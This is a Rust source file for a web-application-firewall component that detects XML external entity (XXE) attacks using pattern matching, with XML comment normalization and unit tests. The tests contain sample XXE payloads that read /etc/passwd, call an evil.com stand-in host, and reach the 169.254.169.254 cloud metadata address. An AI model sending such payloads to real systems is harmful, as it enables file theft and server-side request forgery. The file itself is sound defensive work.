use aho_corasick::AhoCorasick;
use std::sync::Arc;

use crate::waf::attack_detection::config::{AttackDetectionResult, AttackType, InputLocation};
use crate::waf::attack_detection::patterns::DefaultPatterns;

pub struct XxeDetector {
    patterns: Arc<AhoCorasick>,
}

impl XxeDetector {
    pub fn new(paranoia_level: u8, custom_patterns: &[String]) -> Self {
        let mut base_patterns: Vec<String> = DefaultPatterns::xxe()
            .iter()
            .map(|s| s.to_lowercase())
            .collect();

        if paranoia_level >= 3 {
            base_patterns.extend(DefaultPatterns::xxe_high().iter().map(|s| s.to_lowercase()));
        }

        for pattern in custom_patterns {
            let pattern_lower = pattern.to_lowercase();
            if !base_patterns.contains(&pattern_lower) {
                base_patterns.push(pattern_lower);
            }
        }

        let patterns_str: Vec<&str> = base_patterns.iter().map(|s| s.as_str()).collect();
        let patterns = Arc::new(AhoCorasick::new(&patterns_str).unwrap());

        Self { patterns }
    }

    pub fn detect(&self, input: &str, location: InputLocation) -> Option<AttackDetectionResult> {
        let normalized = normalize_xml(input);
        let normalized_lower = normalized.to_lowercase();

        if self.patterns.is_match(&normalized_lower) {
            if let Some(mat) = self.patterns.find(&normalized_lower) {
                let matched = normalized[mat.start()..mat.end()].to_string();

                tracing::warn!(
                    attack_type = "xxe",
                    matched_pattern = %matched,
                    location = %location,
                    "XXE attack detected"
                );

                return Some(AttackDetectionResult {
                    attack_type: AttackType::Xxe,
                    fingerprint: None,
                    matched_pattern: Some(matched),
                    input_location: location,
                });
            }
        }

        None
    }

    pub fn detect_in_headers<F>(
        &self,
        headers: &http::HeaderMap,
        mut check_header: F,
    ) -> Option<AttackDetectionResult>
    where
        F: FnMut(&str) -> bool,
    {
        for (name, value) in headers.iter() {
            if let Ok(header_value) = value.to_str() {
                let header_name = name.as_str();
                if check_header(header_name) {
                    if let Some(result) =
                        self.detect(header_value, InputLocation::Header(header_name.to_string()))
                    {
                        return Some(result);
                    }
                }
            }
        }

        None
    }
}

fn normalize_xml(input: &str) -> String {
    let mut result = String::new();
    let mut chars = input.chars().peekable();
    let mut in_comment = false;

    while let Some(c) = chars.next() {
        if in_comment {
            if c == '-' {
                if let Some(&next) = chars.peek() {
                    if next == '-' {
                        chars.next();
                        if let Some(&next2) = chars.peek() {
                            if next2 == '>' {
                                chars.next();
                                in_comment = false;
                                continue;
                            }
                        }
                    }
                }
            }
            continue;
        }

        if c == '<' {
            if let Some(&next) = chars.peek() {
                if next == '!' {
                    chars.next();
                    if let Some(&next2) = chars.peek() {
                        if next2 == '-' {
                            chars.next();
                            if let Some(&next3) = chars.peek() {
                                if next3 == '-' {
                                    chars.next();
                                    in_comment = true;
                                    continue;
                                }
                            }
                        }
                    }
                }
            }
        }

        match c {
            '\t' | '\n' | '\r' => result.push(' '),
            c => result.push(c),
        }
    }

    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xxe_basic() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_parameter_entity() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com">]>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_ssrf() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!ENTITY xxe SYSTEM "http://169.254.169.254">"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_benign() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<?xml version="1.0"?><root><name>test</name></root>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_none());
    }

    #[test]
    fn test_xxe_case_insensitive() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_uppercase() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!DOCTYPE FOO [<!ENTITY XXE SYSTEM "FILE:///ETC/PASSWD">]>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_mixed_case() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!DoCtYpE foo [<!EnTiTy xxe SyStEm "file:///etc/passwd">]>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }
}
